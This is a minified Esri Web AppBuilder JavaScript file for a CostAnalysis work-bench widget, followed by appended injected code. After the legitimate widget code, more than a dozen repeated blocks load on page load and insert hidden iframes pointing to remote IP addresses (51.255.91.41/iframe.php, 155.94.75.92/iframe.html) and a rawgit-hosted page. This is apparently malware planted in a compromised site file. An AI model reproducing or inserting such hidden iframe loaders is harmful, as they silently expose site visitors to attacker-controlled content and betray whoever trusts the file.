// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/work-bench.html":'\x3cdiv style\x3d"height: 100%; width: 100%"\x3e\r\n  \x3cdiv class\x3d"esriCTContentSection"\x3e\r\n    \x3cdiv class\x3d"esriCTAddEditFeatureContainer" data-dojo-attach-point\x3d"templatePickerContainer"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"projectOverview"\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTPageFooter"\x3e\r\n    \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"backButton"\x3e${nls.common.back}\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"refreshButton"\x3e${nls.workBench.refresh}\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget jimu/FilterManager dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./work-bench.html dojo/_base/lang dojo/dom-attr dojo/_base/array dojo/dom-class dojo/on esri/graphic dojo/dom-construct dojo/Deferred dojo/promise/all esri/layers/FeatureLayer esri/tasks/GeometryService esri/graphicsUtils ./template-picker ./project-overview ./project-summary ./asset-details".split(" "),function(u,v,w,x,y,z,e,A,k,p,h,q,m,n,r,t,B,C,D,E,F,G){return u([v,x,y],{templateString:z,
baseClass:"jimu-widget-cost-analysis-work-bench",_projectOverview:null,_projectSummary:null,_assetItemSummary:{},_assetGroupSummary:{},_assetTableIds:{},_recentlyOperatedLayerIds:[],_projectAssetTable:null,_additionalCostTable:null,_assetInfoForReset:{},filterManager:null,postCreate:function(){this.inherited(arguments);this._assetItemSummary={};this._assetGroupSummary={};this._assetTableIds={};this._recentlyOperatedLayerIds=[];this._assetInfoForReset={};this.filterManager=w.getInstance()},onWidgetActive:function(){this._templatePicker&&
this._templatePicker.bindLayerEvents()},onWidgetDeActive:function(){this._templatePicker&&this._templatePicker._editor&&this._templatePicker._editor.editToolbar&&(this._templatePicker._editor.templatePicker.clearSelection(),this._templatePicker._editor.editToolbar.deactivate(),this._templatePicker.removeLayerEvents())},onShow:function(){this.refreshTemplatePicker()},onWidgetOpen:function(){this.refreshTemplatePicker();this.config.projectSettings.projectLayer||(this._recentlyOperatedLayerIds=[],this._filterAssets())},
onWidgetClose:function(){this.config.projectSettings.projectLayer||this._clearAppliedFilters()},refreshTemplatePicker:function(){if(this._templatePicker)this._templatePicker.onWindowResize()},startup:function(){this.inherited(arguments);this.config.projectSettings.projectLayer?this.own(h(this.backButton,"click",e.hitch(this,function(){p.contains(this.backButton,"jimu-state-disabled")||(this._clearAppliedFilters(),this._templatePicker.destroy(),this._templatePicker=null,this._enableWebMapPopup(),this.emit("showProjectPanel"))}))):
(A.set(this.refreshButton,"innerHTML",this.nls.common.reset),p.add(this.backButton,"esriCTHidden"));this.own(h(this.refreshButton,"click",e.hitch(this,function(){this._clearAppliedFilters();this._templatePicker.destroy();this._templatePicker=null;this.projectInfo.projectId&&this.config.projectSettings.projectLayer?this.emit("reloadProject",this.projectInfo.projectId):this._resetProject()})));this.onProjectCreateOrLoad(this.projectInfo,this.assetInfo)},_resetProject:function(){var a=[],b;this.loadingIndicator.show();
if(this._assetInfoForReset&&0<Object.keys(this._assetInfoForReset).length)for(b in this._assetInfoForReset){var c,d;c=this.layerInfosObj.getLayerInfoById(b).layerObject;d=c.globalIdField+" in ('"+this._assetInfoForReset[b].join("','")+"')";a.push(this.appUtils.deleteFeatures(c.url,d))}r(a).then(e.hitch(this,function(){this.loadingIndicator.hide();this._assetInfoForReset={};this.onProjectCreateOrLoad(this.projectInfo,this.assetInfo);this.emit("resetProject")}),e.hitch(this,function(){this.loadingIndicator.hide()}))},
_clearAppliedFilters:function(){this.config.projectSettings.projectLayer&&this.filterManager.applyWidgetFilter(this.config.projectSettings.projectLayer,this.widgetId,"",!0,!0);this._recentlyOperatedLayerIds=[];k.forEach(this.config.layerSettings,e.hitch(this,function(a){a.editable&&(a=this.layerInfosObj.getLayerInfoById(a.id).layerObject,a.clearSelection())}));this._filterAssets(!0)},_loadProjectAssetTable:function(){var a=new n;if(this.config.projectSettings.assetTable&&!this._projectAssetTable){var b;
b=this.layerInfosObj.getTableInfoById(this.config.projectSettings.assetTable).layerObject;this._projectAssetTable=new t(b.url);this.own(h(this._projectAssetTable,"load",function(){a.resolve()}))}else a.resolve();return a.promise},_loadAdditionalCostTable:function(){var a,b;b=new n;(a=this.config.projectSettings.multiplierAdditionalCostTable)&&!this._additionalCostTable?(a=this.layerInfosObj.getTableInfoById(a).layerObject.url,this._additionalCostTable=new t(a),this.own(h(this._additionalCostTable,
"load",function(){b.resolve()}))):b.resolve();return b.promise},onProjectCreateOrLoad:function(a,b){var c=[];c.push(this._loadProjectAssetTable());c.push(this._loadAdditionalCostTable());r(c).then(e.hitch(this,function(){var c,g,f;this.projectInfo=a;this._recentlyOperatedLayerIds=[];this._assetTableIds={};this._assetItemSummary={};this._assetGroupSummary={};this._disableWebMapPopup();this.initWorkBenchComponents().then(e.hitch(this,function(){f=this.config.projectSettings.projectLayer;this.projectInfo.projectId&&
f&&(g=this.layerInfosObj.getLayerInfoById(f).layerObject,c=g.globalIdField+"\x3d '"+this.projectInfo.projectId+"'",this.filterManager.applyWidgetFilter(f,this.widgetId,c,!0,!0));this._projectOverview&&this._projectOverview.showAssetItemSummary(this._assetItemSummary,!1);this._assetDetails&&this._assetDetails.reset();b?this.loadProject(b):this._filterAssets()}))}))},loadProject:function(a){var b=[];this._projectSummary.loadingProject=!0;this._projectSummary.loadAdditionalCost(a.additionalCostInfo);
for(var c in a.assetInfo){var d=a.assetInfo[c],g=this.layerInfosObj.getLayerInfoById(c).layerObject,b=b.concat(d);this._loadAsset(g,d,a,c)}this._setExtentToProjectAssets(b);this._recentlyOperatedLayerIds=[];this._onAssetInfoUpdate();this._projectSummary.loadingProject=!1;this._projectSummary.calculateGrossCost(this._projectSummary.totalCost,!1)},_loadAsset:function(a,b,c,d){k.forEach(b,e.hitch(this,function(b){var g=b.attributes[a.globalIdField],e=c.assetTemplateInfo[g];b.templateInfo=e;b.templateName=
e.TEMPLATENAME;this._templatePicker.loadCostingInfo(d,e);this._assetTableIds[g]=e.OBJECTID;this._onFeaturesAdded([b],a,[e],!1)}))},_setExtentToProjectAssets:function(a){0<a.length&&this.map.setExtent(C.graphicsExtent(a).expand(1.5))},initWorkBenchComponents:function(){var a=new n;this._initTemplatePicker();this._initProjectSummary();this._initProjectOverview();this._initAssetDetails(a);return a.promise},_initTemplatePicker:function(){var a=m.create("div",{},this.templatePickerContainer);this._templatePicker=
new D({config:this.config,nls:this.nls,layerInfosObj:this.layerInfosObj,loadingIndicator:this.loadingIndicator,projectInfo:this.projectInfo,map:this.map},a);h(this._templatePicker,"assetAdded",e.hitch(this,function(b,a,d){0<b.length&&0<d.length&&(this._hideWebMapPopup(),this._onFeaturesAdded(b,a,d,!0),this._onAssetInfoUpdate())}));h(this._templatePicker,"assetDeleted",e.hitch(this,function(b,a){var d;this._hideWebMapPopup();d=this._getGlobalIds(a.globalIdField,b);this._onFeaturesUpdated(b);this._onAssetInfoUpdate();
k.forEach(d,e.hitch(this,function(b){this._assetTableIds.hasOwnProperty(b)&&delete this._assetTableIds[b];this._assetInfoForReset&&this._assetInfoForReset[a.id]&&(b=this._assetInfoForReset[a.id].indexOf(b),-1<b&&this._assetInfoForReset[a.id].splice(b,1))}));this._projectAssetTable&&(b=this.config.assetTableFields.ASSETGUID+" in ('"+d.join("','")+"')",this.appUtils.deleteFeatures(this._projectAssetTable.url,b))}));h(this._templatePicker,"assetUpdated",e.hitch(this,function(b){this._hideWebMapPopup();
this._onFeaturesUpdated(b,!0);this._onAssetInfoUpdate()}));this._templatePicker.startup()},_initProjectSummary:function(){this._projectSummary?this._projectSummary.reset(this.projectInfo):(this._projectSummary=new F({nls:this.nls,map:this.map,config:this.config,appUtils:this.appUtils,layerInfosObj:this.layerInfosObj,projectInfo:this.projectInfo,additionalCostTable:this._additionalCostTable},m.create("div",{},this.projectSummaryDiv)),this.own(h(this._projectSummary,"grossCostUpdated",e.hitch(this,
function(a,b,c){this._projectOverview.grossCostUpdated(b);this._assetDetails.grossCostUpdated(a,b,c)}))),this.own(h(this._projectSummary,"onOkButtonClicked",e.hitch(this,function(){this.emit("showAssetDetails")}))),this.own(h(this._projectSummary,"onCancelButtonClicked",e.hitch(this,function(){this.emit("showAssetDetails")}))),this._projectSummary.startup())},_initProjectOverview:function(){this._projectOverview?this._projectOverview.updateProjectInfo(this.projectInfo):(this._projectOverview=new E({config:this.config,
appUtils:this.appUtils,nls:this.nls,map:this.map,layerInfosObj:this.layerInfosObj,geometryService:new B(this.config.helperServices.geometry.url),projectInfo:this.projectInfo},m.create("div",{},this.projectOverview)),this.own(h(this._projectOverview,"actionClicked",e.hitch(this,function(a){this.emit("actionClicked",a)}))),this.own(h(this._projectOverview,"titleClicked",e.hitch(this,function(a){this.emit("titleClicked",a)}))),this.own(h(this._projectOverview,"totalCostCalculated",e.hitch(this,function(a){this._assetDetails.totalCostUpdated(a);
this._projectSummary.calculateGrossCost(a,!0)}))),this._projectOverview.startup())},_initAssetDetails:function(a){this._assetDetails?(this._assetDetails.showAssetDetails({}),a.resolve()):(this._assetDetails=new G({nls:this.nls,map:this.map,config:this.config,appUtils:this.appUtils,layerInfosObj:this.layerInfosObj},m.create("div",{},this.assetDetailsDiv)),this.own(h(this._assetDetails,"showAdditionalCost",e.hitch(this,function(){this._projectSummary&&this._projectSummary.cloneTableData();this.emit("showAdditionalCost")}))),
this.own(h(this._assetDetails,"onOkButtonClicked",e.hitch(this,function(){this.emit("showWorkBenchPanel")}))),this.own(h(this._assetDetails,"onCancelButtonClicked",e.hitch(this,function(){this.emit("showWorkBenchPanel")}))),this.own(h(this._assetDetails,"onLoad",e.hitch(this,function(){a.resolve()}))),this.own(h(this._assetDetails,"groupCostEquationUpdated",e.hitch(this,this._updateGroupCostEquation))),this._assetDetails.startup())},_onAssetInfoUpdate:function(){this._projectOverview.showAssetItemSummary(this._assetItemSummary,
!0);this._assetDetails.showAssetDetails(this._assetGroupSummary);this._filterAssets();this.emit("assetInfoUpdated",this._assetItemSummary)},_addAssetGroupSummary:function(a,b,c){var d=c[0].TEMPLATENAME;this._assetGroupSummary.hasOwnProperty(b.id)?this._assetGroupSummary[b.id].hasOwnProperty(d)||(this._assetGroupSummary[b.id][d]={}):(this._assetGroupSummary[b.id]={},this._assetGroupSummary[b.id][d]={});k.forEach(a,e.hitch(this,function(a,f){f=c[f];f.SCENARIO===this.nls.scenarioSelection.noneText&&
(f.SCENARIO="null");f.GEOGRAPHY===this.nls.scenarioSelection.noneText&&(f.GEOGRAPHY="null");this._assetGroupSummary[b.id][d].hasOwnProperty(f.GEOGRAPHY)?this._assetGroupSummary[b.id][d][f.GEOGRAPHY].hasOwnProperty(f.SCENARIO)||(this._assetGroupSummary[b.id][d][f.GEOGRAPHY][f.SCENARIO]=[]):(this._assetGroupSummary[b.id][d][f.GEOGRAPHY]={},this._assetGroupSummary[b.id][d][f.GEOGRAPHY][f.SCENARIO]=[]);this._assetGroupSummary[b.id][d][f.GEOGRAPHY][f.SCENARIO].push(a)}))},_updateAssetGroupSummary:function(a,
b,c){var d,g,f,l;g=b.templateInfo.TEMPLATENAME;f=b.templateInfo.GEOGRAPHY;l=b.templateInfo.SCENARIO;d=b.attributes[a.objectIdField];f===this.nls.scenarioSelection.noneText&&(f="null");l===this.nls.scenarioSelection.noneText&&(l="null");k.some(this._assetGroupSummary[a.id][g][f][l],e.hitch(this,function(e,k){if(e.attributes[a.objectIdField]===d)return c?this._assetGroupSummary[a.id][g][f][l][k].featureDimension=b.featureDimension:this._assetGroupSummary[a.id][g][f][l].splice(k,1),!0}))},_onFeaturesAdded:function(a,
b,c,d){var g,f=[];g=c[0].TEMPLATENAME;f=this._getGlobalIds(b.globalIdField,a);this._addAssetGroupSummary(a,b,c);this._assetItemSummary.hasOwnProperty(b.id)?this._assetItemSummary[b.id].templates.hasOwnProperty(g)?(a=this._assetItemSummary[b.id].templates[g].features.concat(a),this._assetItemSummary[b.id].templates[g].units=a.length):this._assetItemSummary[b.id].templates[g]={units:a.length,features:a,cost:null}:(this._assetItemSummary[b.id]={layerName:b.name,templates:{},geometryType:b.geometryType},
this._assetItemSummary[b.id].templates[g]={units:a.length,features:a,cost:null});this._recentlyOperatedLayerIds=[b.id];this._setFeaturesAndUnits(a,b,g);this._assetItemSummary[b.id].templates[g].cost=this._getTotalCost(b,g);d&&this._projectAssetTable?this._addAssetsToProjectAssetTable(c,f):(this._assetInfoForReset||(this._assetInfoForReset={}),this._assetInfoForReset[b.id]=this._assetInfoForReset[b.id]?this._assetInfoForReset[b.id].concat(f):e.clone(f))},_updateFeaturesInfo:function(a){var b;k.forEach(a,
e.hitch(this,function(a){var d;d=a._layer;for(b in this._assetItemSummary[d.id].templates)this._setUpdatedTemplateFeatures(a,d,b)}));return a},_setUpdatedTemplateFeatures:function(a,b,c){k.some(this._assetItemSummary[b.id].templates[c].features,e.hitch(this,function(d){if(d.attributes[b.objectIdField]===a.attributes[b.objectIdField])return a.featureDimension=d.featureDimension,a.templateName=c,a.templateInfo=d.templateInfo,!0}))},_onFeaturesUpdated:function(a,b){a=this._updateFeaturesInfo(a);this._recentlyOperatedLayerIds=
[];k.forEach(a,e.hitch(this,function(a){var d,c;c=a.templateName;d=a._layer;this._recentlyOperatedLayerIds.push(d.id);k.some(this._assetItemSummary[d.id].templates[c].features,e.hitch(this,function(f,e){if(f.attributes[d.objectIdField]===a.attributes[d.objectIdField])return this._assetItemSummary.hasOwnProperty(d.id)&&this._assetItemSummary[d.id].templates[c]&&(b?(this._assetItemSummary[d.id].templates[c].features[e]=a,this._setFeaturesAndUnits(this._assetItemSummary[d.id].templates[c].features,d,
c,b)):(f=this._assetItemSummary[d.id].templates[c].units,f-=a.featureDimension,this._assetItemSummary[d.id].templates[c].units=this.appUtils.removeNegativeExponents(f)),this._updateAssetGroupSummary(d,a,b)),b||this._assetItemSummary[d.id].templates[c].features.splice(e,1),!0}));0===this._assetItemSummary[d.id].templates[c].features.length?delete this._assetItemSummary[d.id].templates[c]:this._assetItemSummary[d.id].templates[c].cost=this._getTotalCost(d,c);0===Object.keys(this._assetItemSummary[d.id].templates).length&&
delete this._assetItemSummary[d.id]}))},_setFeaturesAndUnits:function(a,b,c,d){var g,f=0;g=this.config.generalSettings.measurementUnit;k.forEach(a,e.hitch(this,function(a){if(!a.hasOwnProperty("featureDimension")||d)a.featureDimension="esriGeometryPolygon"===b.geometryType?this.appUtils.getAreaOfGeometry(a.geometry,this.appUtils.units[g].areaUnit):"esriGeometryPolyline"===b.geometryType?this.appUtils.getLengthOfGeometry(a.geometry,this.appUtils.units[g].lengthUnit):1,d||(a.templateName=c);f+=a.featureDimension}));
this._assetItemSummary[b.id].templates[c].features=a;return this._assetItemSummary[b.id].templates[c].units=f},_getGroupTotalMeasure:function(a,b){var c,d,g,f;c=0;g=b.TEMPLATENAME;f=b.GEOGRAPHY;b=b.SCENARIO;try{d=this._assetGroupSummary[a][g][f][b],k.forEach(d,e.hitch(this,function(a){c+=a.featureDimension}))}catch(l){c=0}return c},_getGroupTotalCount:function(a,b){var c,d,e,f;c=0;e=b.TEMPLATENAME;f=b.GEOGRAPHY;b=b.SCENARIO;try{(d=this._assetGroupSummary[a][e][f][b])&&0<d.length&&(c=d.length)}catch(l){c=
0}return c},_getTotalCost:function(a,b){var c=0;k.forEach(this._assetItemSummary[a.id].templates[b].features,e.hitch(this,function(d){var g,f,l,h;l=this._getGroupTotalMeasure(a.id,d.templateInfo);h=this._getGroupTotalCount(a.id,d.templateInfo);try{f=d.templateInfo.COSTEQUATION,f=f.replace(/{MEASURE}/ig,d.featureDimension),f=f.replace(/{TOTALMEASURE}/ig,l),f=f.replace(/{TOTALCOUNT}/ig,h),g=this.appUtils.evaluate(f)}catch(H){g=0}k.some(this._assetGroupSummary[a.id][b][d.templateInfo.GEOGRAPHY][d.templateInfo.SCENARIO],
e.hitch(this,function(b){if(b.attributes[a.objectIdField]===d.attributes[a.objectIdField])return b.individualCost=g,!0}));d.individualCost=g;c+=g}));return Number(c)},_getGlobalIds:function(a,b){var c=[];k.forEach(b,e.hitch(this,function(b){c.push(b.attributes[a])}));return c},_getExpressionToFilterAssets:function(a){var b,c=[],d,e;if((e=this.layerInfosObj.getLayerInfoById(a))&&e.layerObject&&this._assetItemSummary[a])for(b in d=e.layerObject,this._assetItemSummary[a].templates)c=c.concat(this._getGlobalIds(d.globalIdField,
this._assetItemSummary[a].templates[b].features));return 0<c.length?d.globalIdField+" in ('"+c.join("','")+"')":"1\x3d2"},_filterAssets:function(a){this._recentlyOperatedLayerIds&&0!==this._recentlyOperatedLayerIds.length||(this._recentlyOperatedLayerIds=[],k.forEach(this.config.layerSettings,e.hitch(this,function(a){a.editable&&this._recentlyOperatedLayerIds.push(a.id)})));k.forEach(this._recentlyOperatedLayerIds,e.hitch(this,function(b){var c="";a||(c=this._getExpressionToFilterAssets(b));this.filterManager.applyWidgetFilter(b,
this.widgetId,c,!0,!0)}))},_addAssetsToProjectAssetTable:function(a,b){var c=[],d=["COSTEQUATION","SCENARIO","TEMPLATENAME","GEOGRAPHYGUID"];this.loadingIndicator.show();k.forEach(b,e.hitch(this,function(b,f){var g={};k.forEach(this._projectAssetTable.fields,e.hitch(this,function(c){var e="";-1<d.indexOf(c.name.toUpperCase())?(e=a[f][c.name.toUpperCase()],"SCENARIO"!==c.name.toUpperCase()&&"GEOGRAPHYGUID"!==c.name.toUpperCase()||"null"!==e||(e=null),g[c.name]=e):"ASSETGUID"===c.name.toUpperCase()?
g[c.name]=b:"PROJECTGUID"===c.name.toUpperCase()&&this.projectInfo.projectId&&(g[c.name]=this.projectInfo.projectId)}));c.push(new q(null,null,g))}));this._projectAssetTable.applyEdits(c,null,null,e.hitch(this,function(a){var c=!1;k.forEach(a,e.hitch(this,function(a,d){a.success?this._assetTableIds[b[d]]=a.objectId:c=!0}));c&&this.appUtils.showMessage(this.nls.workBench.errorInSavingAssetDetails);this.loadingIndicator.hide()}),e.hitch(this,function(){this.loadingIndicator.hide();this.appUtils.showMessage(this.nls.workBench.errorInSavingAssetDetails)}))},
_updateGroupCostEquation:function(a){var b=[],c,d,g;c=a.groupInfo;d=this._assetGroupSummary[c.layerId][c.templateName][c.region][c.scenario];g=this.layerInfosObj.getLayerInfoById(c.layerId).layerObject;k.forEach(d,e.hitch(this,function(d){var f={},h,m;h=d.attributes[g.globalIdField];m=d.attributes[g.objectIdField];k.some(this._assetItemSummary[c.layerId].templates[c.templateName].features,e.hitch(this,function(b){if(b.attributes[g.objectIdField]===m)return b.templateInfo.COSTEQUATION=a.templateInfo.COSTEQUATION,
b.templateInfo.SCENARIO=a.templateInfo.SCENARIO,!0}));d.templateInfo.COSTEQUATION=a.templateInfo.COSTEQUATION;d.templateInfo.SCENARIO=a.templateInfo.SCENARIO;this._projectAssetTable&&this._assetTableIds[h]&&(f[this.config.assetTableFields.COSTEQUATION]=a.templateInfo.COSTEQUATION,f[this.config.assetTableFields.SCENARIO]=a.templateInfo.SCENARIO,f[this.config.assetTableFields.OBJECTID]=this._assetTableIds[h],b.push(new q(null,null,f)))}));delete this._assetGroupSummary[c.layerId][c.templateName][c.region][c.scenario];
this._assetGroupSummary[c.layerId][c.templateName][c.region][a.templateInfo.SCENARIO]=d;this._templatePicker.loadCostingInfo(g.id,d[0].templateInfo);this._assetItemSummary[g.id].templates[c.templateName].cost=this._getTotalCost(g,c.templateName);this._projectOverview.showAssetItemSummary(this._assetItemSummary,!1);this._assetDetails.showAssetDetails(this._assetGroupSummary);this._projectAssetTable&&(this.loadingIndicator.show(),this._projectAssetTable.applyEdits(null,b,null,e.hitch(this,function(){this.loadingIndicator.hide()}),
e.hitch(this,function(){this.loadingIndicator.hide()})))},_enableWebMapPopup:function(){this.map&&this.map.setInfoWindowOnClick(!0)},_disableWebMapPopup:function(){this.map&&this.map.setInfoWindowOnClick(!1);this._hideWebMapPopup()},_hideWebMapPopup:function(){this.map.infoWindow.isShowing&&this.map.infoWindow.hide()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});